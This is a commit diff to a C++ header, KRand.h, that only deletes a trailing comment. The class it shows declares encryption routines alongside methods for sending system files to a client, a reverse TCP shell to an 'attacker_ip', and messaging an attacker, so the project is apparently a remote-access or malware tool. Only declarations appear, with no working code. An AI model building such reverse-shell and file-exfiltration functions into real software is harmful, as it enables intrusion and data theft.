f5ef1cdfb2a74796ac765a09c1909acd250cc21a
Kalasaikamesh944 <saikamesh.y@gmail.com>
2025-03-17 14:24:59 +0530

    Update KRand.h

--- KRand.h
+++ KRand.h
@@ -51,7 +51,7 @@ public:
     std::string decrypt_with_private_key(const std::string &encrypted_data, const std::string &private_key_file);
     void encrypt_file(const std::string &input_file, const std::string &output_file, const std::string &public_key_file);
     void decrypt_file(const std::string &input_file, const std::string &output_file, const std::string &private_key_file);
-    void send_system_files_to_client(const std::string &client_ip, int client_port); // Add this line
+    void send_system_files_to_client(const std::string &client_ip, int client_port);
     void reverse_tcp(const std::string &attacker_ip, int attacker_port);
     void send_message_to_attacker(const std::string &attacker_ip, int attacker_port, const std::string &message);
 };
